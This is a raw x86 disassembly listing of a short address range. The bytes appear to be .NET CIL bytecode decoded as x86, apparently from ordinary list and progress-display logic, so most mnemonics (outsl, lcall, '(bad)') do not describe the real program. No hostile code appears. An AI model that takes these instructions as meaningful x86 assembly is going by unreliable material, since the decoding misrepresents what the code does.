  403529:	2b 58 28             	sub    0x28(%eax),%ebx
  40352c:	59                   	pop    %ecx
  40352d:	00 00                	add    %al,(%eax)
  40352f:	0a 02                	or     (%edx),%al
  403531:	02 28                	add    (%eax),%ch
  403533:	33 00                	xor    (%eax),%eax
  403535:	00 0a                	add    %cl,(%edx)
  403537:	6f                   	outsl  %ds:(%esi),(%dx)
  403538:	34 00                	xor    $0x0,%al
  40353a:	00 0a                	add    %cl,(%edx)
  40353c:	13 0b                	adc    (%ebx),%ecx
  40353e:	12 0b                	adc    (%ebx),%cl
  403540:	28 35 00 00 0a 02    	sub    %dh,0x20a0000
  403546:	28 57 00             	sub    %dl,0x0(%edi)
  403549:	00 0a                	add    %cl,(%edx)
  40354b:	59                   	pop    %ecx
  40354c:	18 5b 02             	sbb    %bl,0x2(%ebx)
  40354f:	28 33                	sub    %dh,(%ebx)
  403551:	00 00                	add    %al,(%eax)
  403553:	0a 6f 34             	or     0x34(%edi),%ch
  403556:	00 00                	add    %al,(%eax)
  403558:	0a 13                	or     (%ebx),%dl
  40355a:	0c 12                	or     $0x12,%al
  40355c:	0c 28                	or     $0x28,%al
  40355e:	98                   	cwtl
  40355f:	00 00                	add    %al,(%eax)
  403561:	0a 02                	or     (%edx),%al
  403563:	28 58 00             	sub    %bl,0x0(%eax)
  403566:	00 0a                	add    %cl,(%edx)
  403568:	59                   	pop    %ecx
  403569:	18 5b 73             	sbb    %bl,0x73(%ebx)
  40356c:	31 00                	xor    %eax,(%eax)
  40356e:	00 0a                	add    %cl,(%edx)
  403570:	28 99 00 00 0a 2a    	sub    %bl,0x2a0a0000(%ecx)
  403576:	02 02                	add    (%edx),%al
  403578:	28 33                	sub    %dh,(%ebx)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	0a 6f 34             	or     0x34(%edi),%ch
  40357f:	00 00                	add    %al,(%eax)
  403581:	0a 13                	or     (%ebx),%dl
  403583:	0d 12 0d 28 98       	or     $0x98280d12,%eax
  403588:	00 00                	add    %al,(%eax)
  40358a:	0a 28                	or     (%eax),%ch
  40358c:	59                   	pop    %ecx
  40358d:	00 00                	add    %al,(%eax)
  40358f:	0a 02                	or     (%edx),%al
  403591:	02 28                	add    (%eax),%ch
  403593:	33 00                	xor    (%eax),%eax
  403595:	00 0a                	add    %cl,(%edx)
  403597:	6f                   	outsl  %ds:(%esi),(%dx)
  403598:	34 00                	xor    $0x0,%al
  40359a:	00 0a                	add    %cl,(%edx)
  40359c:	13 0e                	adc    (%esi),%ecx
  40359e:	12 0e                	adc    (%esi),%cl
  4035a0:	28 35 00 00 0a 02    	sub    %dh,0x20a0000
  4035a6:	28 57 00             	sub    %dl,0x0(%edi)
  4035a9:	00 0a                	add    %cl,(%edx)
  4035ab:	59                   	pop    %ecx
  4035ac:	18 5b 16             	sbb    %bl,0x16(%ebx)
  4035af:	73 31                	jae    0x4035e2
  4035b1:	00 00                	add    %al,(%eax)
  4035b3:	0a 28                	or     (%eax),%ch
  4035b5:	99                   	cltd
  4035b6:	00 00                	add    %al,(%eax)
  4035b8:	0a 2a                	or     (%edx),%ch
  4035ba:	06                   	push   %es
  4035bb:	16                   	push   %ss
  4035bc:	3c e1                	cmp    $0xe1,%al
  4035be:	02 00                	add    (%eax),%al
  4035c0:	00 12                	add    %dl,(%edx)
  4035c2:	03 fe                	add    %esi,%edi
  4035c4:	15 0d 00 00 02       	adc    $0x200000d,%eax
  4035c9:	12 03                	adc    (%ebx),%al
  4035cb:	03 6f 92             	add    -0x6e(%edi),%ebp
  4035ce:	00 00                	add    %al,(%eax)
  4035d0:	0a 7d 34             	or     0x34(%ebp),%bh
  4035d3:	00 00                	add    %al,(%eax)
  4035d5:	04 12                	add    $0x12,%al
  4035d7:	03 03                	add    (%ebx),%eax
  4035d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4035da:	9a 00 00 0a 7d 35 00 	lcall  $0x35,$0x7d0a0000
  4035e1:	00 04 12             	add    %al,(%edx,%edx,1)
  4035e4:	03 16                	add    (%esi),%edx
  4035e6:	7d 36                	jge    0x40361e
  4035e8:	00 00                	add    %al,(%eax)
  4035ea:	04 15                	add    $0x15,%al
  4035ec:	13 04 15 13 05 12 03 	adc    0x3120513(,%edx,1),%eax
  4035f3:	7b 35                	jnp    0x40362a
  4035f5:	00 00                	add    %al,(%eax)
  4035f7:	04 16                	add    $0x16,%al
  4035f9:	32 3b                	xor    (%ebx),%bh
  4035fb:	16                   	push   %ss
  4035fc:	13 06                	adc    (%esi),%eax
  4035fe:	2b 27                	sub    (%edi),%esp
  403600:	02 7b 2e             	add    0x2e(%ebx),%bh
  403603:	00 00                	add    %al,(%eax)
  403605:	04 11                	add    $0x11,%al
  403607:	06                   	push   %es
  403608:	6f                   	outsl  %ds:(%esi),(%dx)
  403609:	83 00 00             	addl   $0x0,(%eax)
  40360c:	0a 7b 34             	or     0x34(%ebx),%bh
  40360f:	00 00                	add    %al,(%eax)
  403611:	04 12                	add    $0x12,%al
  403613:	03 7b 35             	add    0x35(%ebx),%edi
  403616:	00 00                	add    %al,(%eax)
  403618:	04 33                	add    $0x33,%al
  40361a:	06                   	push   %es
  40361b:	11 06                	adc    %eax,(%esi)
  40361d:	13 05 2b 15 11 06    	adc    0x611152b,%eax
  403623:	17                   	pop    %ss
  403624:	58                   	pop    %eax
  403625:	13 06                	adc    (%esi),%eax
  403627:	11 06                	adc    %eax,(%esi)
  403629:	02 7b 2e             	add    0x2e(%ebx),%bh
  40362c:	00 00                	add    %al,(%eax)
  40362e:	04 6f                	add    $0x6f,%al
  403630:	8f 00                	pop    (%eax)
  403632:	00 0a                	add    %cl,(%edx)
  403634:	32 ca                	xor    %dl,%cl
  403636:	11 05 16 3f 8f 00    	adc    %eax,0x8f3f16
  40363c:	00 00                	add    %al,(%eax)
  40363e:	12 03                	adc    (%ebx),%al
  403640:	02 7b 2e             	add    0x2e(%ebx),%bh
  403643:	00 00                	add    %al,(%eax)
  403645:	04 11                	add    $0x11,%al
  403647:	05 6f 83 00 00       	add    $0x836f,%eax
  40364c:	0a 7b 36             	or     0x36(%ebx),%bh
  40364f:	00 00                	add    %al,(%eax)
  403651:	04 17                	add    $0x17,%al
  403653:	58                   	pop    %eax
  403654:	7d 36                	jge    0x40368c
  403656:	00 00                	add    %al,(%eax)
  403658:	04 11                	add    $0x11,%al
  40365a:	05 17 58 13 07       	add    $0x7135817,%eax
  40365f:	2b 5d 02             	sub    0x2(%ebp),%ebx
  403662:	7b 2e                	jnp    0x403692
  403664:	00 00                	add    %al,(%eax)
  403666:	04 11                	add    $0x11,%al
  403668:	07                   	pop    %es
  403669:	6f                   	outsl  %ds:(%esi),(%dx)
  40366a:	83 00 00             	addl   $0x0,(%eax)
  40366d:	0a 7b 36             	or     0x36(%ebx),%bh
  403670:	00 00                	add    %al,(%eax)
  403672:	04 12                	add    $0x12,%al
  403674:	03 7b 36             	add    0x36(%ebx),%edi
  403677:	00 00                	add    %al,(%eax)
  403679:	04 32                	add    $0x32,%al
  40367b:	36 02 7b 2e          	add    %ss:0x2e(%ebx),%bh
  40367f:	00 00                	add    %al,(%eax)
  403681:	04 11                	add    $0x11,%al
  403683:	07                   	pop    %es
  403684:	6f                   	outsl  %ds:(%esi),(%dx)
  403685:	83 00 00             	addl   $0x0,(%eax)
  403688:	0a 7b 36             	or     0x36(%ebx),%bh
  40368b:	00 00                	add    %al,(%eax)
  40368d:	04 12                	add    $0x12,%al
  40368f:	03 7b 36             	add    0x36(%ebx),%edi
  403692:	00 00                	add    %al,(%eax)
  403694:	04 33                	add    $0x33,%al
  403696:	21 02                	and    %eax,(%edx)
  403698:	7b 2e                	jnp    0x4036c8
  40369a:	00 00                	add    %al,(%eax)
  40369c:	04 11                	add    $0x11,%al
  40369e:	07                   	pop    %es
  40369f:	6f                   	outsl  %ds:(%esi),(%dx)
  4036a0:	83 00 00             	addl   $0x0,(%eax)
  4036a3:	0a 7b 35             	or     0x35(%ebx),%bh
  4036a6:	00 00                	add    %al,(%eax)
  4036a8:	04 12                	add    $0x12,%al
  4036aa:	03 7b 35             	add    0x35(%ebx),%edi
  4036ad:	00 00                	add    %al,(%eax)
  4036af:	04 2e                	add    $0x2e,%al
  4036b1:	06                   	push   %es
  4036b2:	11 07                	adc    %eax,(%edi)
  4036b4:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  4036b7:	15 11 07 17 58       	adc    $0x58170711,%eax
  4036bc:	13 07                	adc    (%edi),%eax
  4036be:	11 07                	adc    %eax,(%edi)
  4036c0:	02 7b 2e             	add    0x2e(%ebx),%bh
  4036c3:	00 00                	add    %al,(%eax)
  4036c5:	04 6f                	add    $0x6f,%al
  4036c7:	8f 00                	pop    (%eax)
  4036c9:	00 0a                	add    %cl,(%edx)
  4036cb:	32 94 11 04 15 33 30 	xor    0x30331504(%ecx,%edx,1),%dl
  4036d2:	02 12                	add    (%edx),%dl
  4036d4:	03 02                	add    (%edx),%eax
  4036d6:	7b 2e                	jnp    0x403706
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	04 6f                	add    $0x6f,%al
  4036dc:	8f 00                	pop    (%eax)
  4036de:	00 0a                	add    %cl,(%edx)
  4036e0:	28 2f                	sub    %ch,(%edi)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	06                   	push   %es
  4036e5:	02 7b 2e             	add    0x2e(%ebx),%bh
  4036e8:	00 00                	add    %al,(%eax)
  4036ea:	04 6f                	add    $0x6f,%al
  4036ec:	8f 00                	pop    (%eax)
  4036ee:	00 0a                	add    %cl,(%edx)
  4036f0:	0a 02                	or     (%edx),%al
  4036f2:	7b 2e                	jnp    0x403722
  4036f4:	00 00                	add    %al,(%eax)
  4036f6:	04 09                	add    $0x9,%al
  4036f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4036f9:	9b                   	fwait
  4036fa:	00 00                	add    %al,(%eax)
  4036fc:	0a 38                	or     (%eax),%bh
  4036fe:	d8 00                	fadds  (%eax)
  403700:	00 00                	add    %al,(%eax)
  403702:	02 12                	add    (%edx),%dl
  403704:	03 11                	add    (%ecx),%edx
  403706:	04 28                	add    $0x28,%al
  403708:	2f                   	das
  403709:	00 00                	add    %al,(%eax)
  40370b:	06                   	push   %es
  40370c:	11 04 0a             	adc    %eax,(%edx,%ecx,1)
  40370f:	02 7b 2e             	add    0x2e(%ebx),%bh
  403712:	00 00                	add    %al,(%eax)
  403714:	04 11                	add    $0x11,%al
  403716:	04 09                	add    $0x9,%al
  403718:	6f                   	outsl  %ds:(%esi),(%dx)
  403719:	9c                   	pushf
  40371a:	00 00                	add    %al,(%eax)
  40371c:	0a 06                	or     (%esi),%al
  40371e:	17                   	pop    %ss
  40371f:	58                   	pop    %eax
  403720:	13 08                	adc    (%eax),%ecx
  403722:	38 a1 00 00 00 02    	cmp    %ah,0x2000000(%ecx)
  403728:	7b 2e                	jnp    0x403758
  40372a:	00 00                	add    %al,(%eax)
  40372c:	04 11                	add    $0x11,%al
  40372e:	08 6f 83             	or     %ch,-0x7d(%edi)
  403731:	00 00                	add    %al,(%eax)
  403733:	0a 7b 2f             	or     0x2f(%ebx),%bh
  403736:	00 00                	add    %al,(%eax)
  403738:	04 1f                	add    $0x1f,%al
  40373a:	68 11 08 5a 1f       	push   $0x1f5a0811
  40373f:	0a 58 6f             	or     0x6f(%eax),%bl
  403742:	87 00                	xchg   %eax,(%eax)
  403744:	00 0a                	add    %cl,(%edx)
  403746:	02 7b 2e             	add    0x2e(%ebx),%bh
  403749:	00 00                	add    %al,(%eax)
  40374b:	04 11                	add    $0x11,%al
  40374d:	08 6f 83             	or     %ch,-0x7d(%edi)
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 7b 30             	or     0x30(%ebx),%bh
  403755:	00 00                	add    %al,(%eax)
  403757:	04 1f                	add    $0x1f,%al
  403759:	68 11 08 5a 1f       	push   $0x1f5a0811
  40375e:	1a 58 6f             	sbb    0x6f(%eax),%bl
  403761:	87 00                	xchg   %eax,(%eax)
  403763:	00 0a                	add    %cl,(%edx)
  403765:	02 7b 2e             	add    0x2e(%ebx),%bh
  403768:	00 00                	add    %al,(%eax)
  40376a:	04 11                	add    $0x11,%al
  40376c:	08 6f 83             	or     %ch,-0x7d(%edi)
  40376f:	00 00                	add    %al,(%eax)
  403771:	0a 7b 31             	or     0x31(%ebx),%bh
  403774:	00 00                	add    %al,(%eax)
  403776:	04 1f                	add    $0x1f,%al
  403778:	68 11 08 5a 1f       	push   $0x1f5a0811
  40377d:	2f                   	das
  40377e:	58                   	pop    %eax
  40377f:	6f                   	outsl  %ds:(%esi),(%dx)
  403780:	87 00                	xchg   %eax,(%eax)
  403782:	00 0a                	add    %cl,(%edx)
  403784:	02 7b 2e             	add    0x2e(%ebx),%bh
  403787:	00 00                	add    %al,(%eax)
  403789:	04 11                	add    $0x11,%al
  40378b:	08 6f 83             	or     %ch,-0x7d(%edi)
  40378e:	00 00                	add    %al,(%eax)
  403790:	0a 7b 32             	or     0x32(%ebx),%bh
  403793:	00 00                	add    %al,(%eax)
  403795:	04 1f                	add    $0x1f,%al
  403797:	68 11 08 5a 1f       	push   $0x1f5a0811
  40379c:	48                   	dec    %eax
  40379d:	58                   	pop    %eax
  40379e:	6f                   	outsl  %ds:(%esi),(%dx)
  40379f:	87 00                	xchg   %eax,(%eax)
  4037a1:	00 0a                	add    %cl,(%edx)
  4037a3:	02 7b 2e             	add    0x2e(%ebx),%bh
  4037a6:	00 00                	add    %al,(%eax)
  4037a8:	04 11                	add    $0x11,%al
  4037aa:	08 6f 83             	or     %ch,-0x7d(%edi)
  4037ad:	00 00                	add    %al,(%eax)
  4037af:	0a 7b 33             	or     0x33(%ebx),%bh
  4037b2:	00 00                	add    %al,(%eax)
  4037b4:	04 1f                	add    $0x1f,%al
  4037b6:	68 11 08 5a 1f       	push   $0x1f5a0811
  4037bb:	58                   	pop    %eax
  4037bc:	58                   	pop    %eax
  4037bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4037be:	87 00                	xchg   %eax,(%eax)
  4037c0:	00 0a                	add    %cl,(%edx)
  4037c2:	11 08                	adc    %ecx,(%eax)
  4037c4:	17                   	pop    %ss
  4037c5:	58                   	pop    %eax
  4037c6:	13 08                	adc    (%eax),%ecx
  4037c8:	11 08                	adc    %ecx,(%eax)
  4037ca:	02 7b 2e             	add    0x2e(%ebx),%bh
  4037cd:	00 00                	add    %al,(%eax)
  4037cf:	04 6f                	add    $0x6f,%al
  4037d1:	8f 00                	pop    (%eax)
  4037d3:	00 0a                	add    %cl,(%edx)
  4037d5:	3f                   	aas
  4037d6:	4d                   	dec    %ebp
  4037d7:	ff                   	(bad)
  4037d8:	ff                   	(bad)
  4037d9:	ff 1f                	lcall  *(%edi)
  4037db:	68 02 7b 2e 00       	push   $0x2e7b02
  4037e0:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4037e3:	8f 00                	pop    (%eax)
  4037e5:	00 0a                	add    %cl,(%edx)
  4037e7:	5a                   	pop    %edx
  4037e8:	1f                   	pop    %ds
  4037e9:	2b 58 02             	sub    0x2(%eax),%ebx
  4037ec:	28 33                	sub    %dh,(%ebx)
  4037ee:	00 00                	add    %al,(%eax)
  4037f0:	0a 6f 34             	or     0x34(%edi),%ch
  4037f3:	00 00                	add    %al,(%eax)
  4037f5:	0a 13                	or     (%ebx),%dl
  4037f7:	0f 12 0f             	movlps (%edi),%xmm1
  4037fa:	28 98 00 00 0a 30    	sub    %bl,0x300a0000(%eax)
  403800:	5e                   	pop    %esi
  403801:	02 1f                	add    (%edi),%bl
  403803:	68 02 7b 2e 00       	push   $0x2e7b02
  403808:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40380b:	8f 00                	pop    (%eax)
  40380d:	00 0a                	add    %cl,(%edx)
  40380f:	5a                   	pop    %edx
  403810:	1f                   	pop    %ds
  403811:	2b 58 28             	sub    0x28(%eax),%ebx
  403814:	59                   	pop    %ecx
  403815:	00 00                	add    %al,(%eax)
  403817:	0a 02                	or     (%edx),%al
  403819:	02 28                	add    (%eax),%ch
  40381b:	33 00                	xor    (%eax),%eax
  40381d:	00 0a                	add    %cl,(%edx)
  40381f:	6f                   	outsl  %ds:(%esi),(%dx)
  403820:	34 00                	xor    $0x0,%al
  403822:	00 0a                	add    %cl,(%edx)
  403824:	13 10                	adc    (%eax),%edx
  403826:	12 10                	adc    (%eax),%dl
  403828:	28 35 00 00 0a 02    	sub    %dh,0x20a0000
  40382e:	28 57 00             	sub    %dl,0x0(%edi)
  403831:	00 0a                	add    %cl,(%edx)
  403833:	59                   	pop    %ecx
  403834:	18 5b 02             	sbb    %bl,0x2(%ebx)
  403837:	28 33                	sub    %dh,(%ebx)
  403839:	00 00                	add    %al,(%eax)
  40383b:	0a 6f 34             	or     0x34(%edi),%ch
  40383e:	00 00                	add    %al,(%eax)
  403840:	0a 13                	or     (%ebx),%dl
  403842:	11 12                	adc    %edx,(%edx)
  403844:	11 28                	adc    %ebp,(%eax)
  403846:	98                   	cwtl
  403847:	00 00                	add    %al,(%eax)
  403849:	0a 02                	or     (%edx),%al
  40384b:	28 58 00             	sub    %bl,0x0(%eax)
  40384e:	00 0a                	add    %cl,(%edx)
  403850:	59                   	pop    %ecx
  403851:	18 5b 73             	sbb    %bl,0x73(%ebx)
  403854:	31 00                	xor    %eax,(%eax)
  403856:	00 0a                	add    %cl,(%edx)
  403858:	28 99 00 00 0a 2b    	sub    %bl,0x2b0a0000(%ecx)
  40385e:	43                   	inc    %ebx
  40385f:	02 02                	add    (%edx),%al
  403861:	28 33                	sub    %dh,(%ebx)
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 6f 34             	or     0x34(%edi),%ch
  403868:	00 00                	add    %al,(%eax)
  40386a:	0a 13                	or     (%ebx),%dl
  40386c:	12 12                	adc    (%edx),%dl
  40386e:	12 28                	adc    (%eax),%ch
  403870:	98                   	cwtl
  403871:	00 00                	add    %al,(%eax)
  403873:	0a 28                	or     (%eax),%ch
  403875:	59                   	pop    %ecx
  403876:	00 00                	add    %al,(%eax)
  403878:	0a 02                	or     (%edx),%al
  40387a:	02 28                	add    (%eax),%ch
  40387c:	33 00                	xor    (%eax),%eax
  40387e:	00 0a                	add    %cl,(%edx)
  403880:	6f                   	outsl  %ds:(%esi),(%dx)
  403881:	34 00                	xor    $0x0,%al
  403883:	00 0a                	add    %cl,(%edx)
  403885:	13 13                	adc    (%ebx),%edx
  403887:	12 13                	adc    (%ebx),%dl
  403889:	28 35 00 00 0a 02    	sub    %dh,0x20a0000
  40388f:	28 57 00             	sub    %dl,0x0(%edi)
  403892:	00 0a                	add    %cl,(%edx)
  403894:	59                   	pop    %ecx
  403895:	18 5b 16             	sbb    %bl,0x16(%ebx)
  403898:	73 31                	jae    0x4038cb
  40389a:	00 00                	add    %al,(%eax)
  40389c:	0a 28                	or     (%eax),%ch
  40389e:	99                   	cltd
  40389f:	00 00                	add    %al,(%eax)
  4038a1:	0a 03                	or     (%ebx),%al
  4038a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4038a4:	9d                   	popf
  4038a5:	00 00                	add    %al,(%eax)
  4038a7:	0a 28                	or     (%eax),%ch
  4038a9:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  4038ae:	1e                   	push   %ds
  4038af:	02 7b 2e             	add    0x2e(%ebx),%bh
  4038b2:	00 00                	add    %al,(%eax)
  4038b4:	04 06                	add    $0x6,%al
  4038b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b7:	83 00 00             	addl   $0x0,(%eax)
  4038ba:	0a 7b 2f             	or     0x2f(%ebx),%bh
  4038bd:	00 00                	add    %al,(%eax)
  4038bf:	04 03                	add    $0x3,%al
  4038c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4038c2:	9d                   	popf
  4038c3:	00 00                	add    %al,(%eax)
  4038c5:	0a 6f 30             	or     0x30(%edi),%ch
  4038c8:	00 00                	add    %al,(%eax)
  4038ca:	0a 2b                	or     (%ebx),%ch
  4038cc:	1b 02                	sbb    (%edx),%eax
  4038ce:	7b 2e                	jnp    0x4038fe
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	04 06                	add    $0x6,%al
  4038d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038d5:	83 00 00             	addl   $0x0,(%eax)
  4038d8:	0a 7b 2f             	or     0x2f(%ebx),%bh
  4038db:	00 00                	add    %al,(%eax)
  4038dd:	04 72                	add    $0x72,%al
  4038df:	01 00                	add    %eax,(%eax)
  4038e1:	00 70 6f             	add    %dh,0x6f(%eax)
  4038e4:	30 00                	xor    %al,(%eax)
  4038e6:	00 0a                	add    %cl,(%edx)
  4038e8:	03 6f 9e             	add    -0x62(%edi),%ebp
  4038eb:	00 00                	add    %al,(%eax)
  4038ed:	0a 28                	or     (%eax),%ch
  4038ef:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  4038f4:	1e                   	push   %ds
  4038f5:	02 7b 2e             	add    0x2e(%ebx),%bh
  4038f8:	00 00                	add    %al,(%eax)
  4038fa:	04 06                	add    $0x6,%al
  4038fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4038fd:	83 00 00             	addl   $0x0,(%eax)
  403900:	0a 7b 30             	or     0x30(%ebx),%bh
  403903:	00 00                	add    %al,(%eax)
  403905:	04 03                	add    $0x3,%al
  403907:	6f                   	outsl  %ds:(%esi),(%dx)
  403908:	9e                   	sahf
  403909:	00 00                	add    %al,(%eax)
  40390b:	0a 6f 30             	or     0x30(%edi),%ch
  40390e:	00 00                	add    %al,(%eax)
  403910:	0a 2b                	or     (%ebx),%ch
  403912:	1b 02                	sbb    (%edx),%eax
  403914:	7b 2e                	jnp    0x403944
  403916:	00 00                	add    %al,(%eax)
  403918:	04 06                	add    $0x6,%al
  40391a:	6f                   	outsl  %ds:(%esi),(%dx)
  40391b:	83 00 00             	addl   $0x0,(%eax)
  40391e:	0a 7b 30             	or     0x30(%ebx),%bh
  403921:	00 00                	add    %al,(%eax)
  403923:	04 72                	add    $0x72,%al
  403925:	01 00                	add    %eax,(%eax)
  403927:	00 70 6f             	add    %dh,0x6f(%eax)
  40392a:	30 00                	xor    %al,(%eax)
  40392c:	00 0a                	add    %cl,(%edx)
  40392e:	03 6f 9f             	add    -0x61(%edi),%ebp
  403931:	00 00                	add    %al,(%eax)
  403933:	0a 16                	or     (%esi),%dl
  403935:	32 78 03             	xor    0x3(%eax),%bh
  403938:	6f                   	outsl  %ds:(%esi),(%dx)
  403939:	9f                   	lahf
  40393a:	00 00                	add    %al,(%eax)
  40393c:	0a 1f                	or     (%edi),%bl
  40393e:	64 30 6e 03          	xor    %ch,%fs:0x3(%esi)
  403942:	6f                   	outsl  %ds:(%esi),(%dx)
  403943:	9f                   	lahf
  403944:	00 00                	add    %al,(%eax)
  403946:	0a 1f                	or     (%edi),%bl
  403948:	64 2f                	fs das
  40394a:	20 02                	and    %al,(%edx)
  40394c:	7b 2e                	jnp    0x40397c
  40394e:	00 00                	add    %al,(%eax)
  403950:	04 06                	add    $0x6,%al
  403952:	6f                   	outsl  %ds:(%esi),(%dx)
  403953:	83 00 00             	addl   $0x0,(%eax)
  403956:	0a 7b 31             	or     0x31(%ebx),%bh
  403959:	00 00                	add    %al,(%eax)
  40395b:	04 03                	add    $0x3,%al
  40395d:	6f                   	outsl  %ds:(%esi),(%dx)
  40395e:	9f                   	lahf
  40395f:	00 00                	add    %al,(%eax)
  403961:	0a 17                	or     (%edi),%dl
  403963:	58                   	pop    %eax
  403964:	6f                   	outsl  %ds:(%esi),(%dx)
  403965:	84 00                	test   %al,(%eax)
  403967:	00 0a                	add    %cl,(%edx)
  403969:	2b 18                	sub    (%eax),%ebx
  40396b:	02 7b 2e             	add    0x2e(%ebx),%bh
  40396e:	00 00                	add    %al,(%eax)
  403970:	04 06                	add    $0x6,%al
  403972:	6f                   	outsl  %ds:(%esi),(%dx)
  403973:	83 00 00             	addl   $0x0,(%eax)
  403976:	0a 7b 31             	or     0x31(%ebx),%bh
  403979:	00 00                	add    %al,(%eax)
  40397b:	04 1f                	add    $0x1f,%al
  40397d:	63 6f 84             	arpl   %ebp,-0x7c(%edi)
  403980:	00 00                	add    %al,(%eax)
  403982:	0a 02                	or     (%edx),%al
  403984:	7b 2e                	jnp    0x4039b4
  403986:	00 00                	add    %al,(%eax)
  403988:	04 06                	add    $0x6,%al
  40398a:	6f                   	outsl  %ds:(%esi),(%dx)
  40398b:	83 00 00             	addl   $0x0,(%eax)
  40398e:	0a 7b 31             	or     0x31(%ebx),%bh
  403991:	00 00                	add    %al,(%eax)
  403993:	04 17                	add    $0x17,%al
  403995:	6f                   	outsl  %ds:(%esi),(%dx)
  403996:	1b 00                	sbb    (%eax),%eax
  403998:	00 0a                	add    %cl,(%edx)
  40399a:	02 06                	add    (%esi),%al
  40399c:	7d 2b                	jge    0x4039c9
  40399e:	00 00                	add    %al,(%eax)
  4039a0:	04 02                	add    $0x2,%al
  4039a2:	03 6f 9f             	add    -0x61(%edi),%ebp
  4039a5:	00 00                	add    %al,(%eax)
  4039a7:	0a 7d 2c             	or     0x2c(%ebp),%bh
  4039aa:	00 00                	add    %al,(%eax)
  4039ac:	04 2b                	add    $0x2b,%al
  4039ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4039af:	03 6f 9f             	add    -0x61(%edi),%ebp
  4039b2:	00 00                	add    %al,(%eax)
  4039b4:	0a 1f                	or     (%edi),%bl
  4039b6:	64 31 3e             	xor    %edi,%fs:(%esi)
  4039b9:	02 7b 2e             	add    0x2e(%ebx),%bh
  4039bc:	00 00                	add    %al,(%eax)
  4039be:	04 06                	add    $0x6,%al
  4039c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c1:	83 00 00             	addl   $0x0,(%eax)
  4039c4:	0a 7b 31             	or     0x31(%ebx),%bh
  4039c7:	00 00                	add    %al,(%eax)
  4039c9:	04 16                	add    $0x16,%al
  4039cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4039cc:	84 00                	test   %al,(%eax)
  4039ce:	00 0a                	add    %cl,(%edx)
  4039d0:	02 7b 2e             	add    0x2e(%ebx),%bh
  4039d3:	00 00                	add    %al,(%eax)
  4039d5:	04 06                	add    $0x6,%al
  4039d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d8:	83 00 00             	addl   $0x0,(%eax)
  4039db:	0a 7b 31             	or     0x31(%ebx),%bh
  4039de:	00 00                	add    %al,(%eax)
  4039e0:	04 17                	add    $0x17,%al
  4039e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039e3:	1b 00                	sbb    (%eax),%eax
  4039e5:	00 0a                	add    %cl,(%edx)
  4039e7:	02 06                	add    (%esi),%al
  4039e9:	7d 2b                	jge    0x403a16
  4039eb:	00 00                	add    %al,(%eax)
  4039ed:	04 02                	add    $0x2,%al
  4039ef:	16                   	push   %ss
  4039f0:	7d 2c                	jge    0x403a1e
  4039f2:	00 00                	add    %al,(%eax)
  4039f4:	04 2b                	add    $0x2b,%al
  4039f6:	27                   	daa
  4039f7:	02 7b 2e             	add    0x2e(%ebx),%bh
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	04 06                	add    $0x6,%al
  4039fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4039ff:	83 00 00             	addl   $0x0,(%eax)
  403a02:	0a 7b 31             	or     0x31(%ebx),%bh
  403a05:	00 00                	add    %al,(%eax)
  403a07:	04 16                	add    $0x16,%al
  403a09:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0a:	1b 00                	sbb    (%eax),%eax
  403a0c:	00 0a                	add    %cl,(%edx)
  403a0e:	02 7b 2b             	add    0x2b(%ebx),%bh
  403a11:	00 00                	add    %al,(%eax)
  403a13:	04 06                	add    $0x6,%al
  403a15:	33 07                	xor    (%edi),%eax
  403a17:	02 15 7d 2b 00 00    	add    0x2b7d,%dl
  403a1d:	04 03                	add    $0x3,%al
  403a1f:	6f                   	outsl  %ds:(%esi),(%dx)
  403a20:	a0 00 00 0a 16       	mov    0x160a0000,%al
  403a25:	32 60 12             	xor    0x12(%eax),%ah
  403a28:	09 16                	or     %edx,(%esi)
  403a2a:	16                   	push   %ss
  403a2b:	03 6f a0             	add    -0x60(%edi),%ebp
  403a2e:	00 00                	add    %al,(%eax)
  403a30:	0a 28                	or     (%eax),%ch
  403a32:	a1 00 00 0a 02       	mov    0x20a0000,%eax
  403a37:	7b 2e                	jnp    0x403a67
  403a39:	00 00                	add    %al,(%eax)
  403a3b:	04 06                	add    $0x6,%al
  403a3d:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3e:	83 00 00             	addl   $0x0,(%eax)
  403a41:	0a 7b 32             	or     0x32(%ebx),%bh
  403a44:	00 00                	add    %al,(%eax)
  403a46:	04 72                	add    $0x72,%al
  403a48:	07                   	pop    %es
  403a49:	01 00                	add    %eax,(%eax)
  403a4b:	70 72                	jo     0x403abf
  403a4d:	29 01                	sub    %eax,(%ecx)
  403a4f:	00 70 12             	add    %dh,0x12(%eax)
  403a52:	09 28                	or     %ebp,(%eax)
  403a54:	a2 00 00 0a 69       	mov    %al,0x690a0000
  403a59:	8c 5d 00             	mov    %ds,0x0(%ebp)
  403a5c:	00 01                	add    %al,(%ecx)
  403a5e:	12 09                	adc    (%ecx),%cl
  403a60:	28 a3 00 00 0a 8c    	sub    %ah,-0x73f60000(%ebx)
  403a66:	5d                   	pop    %ebp
  403a67:	00 00                	add    %al,(%eax)
  403a69:	01 12                	add    %edx,(%edx)
  403a6b:	09 28                	or     %ebp,(%eax)
  403a6d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a6e:	00 00                	add    %al,(%eax)
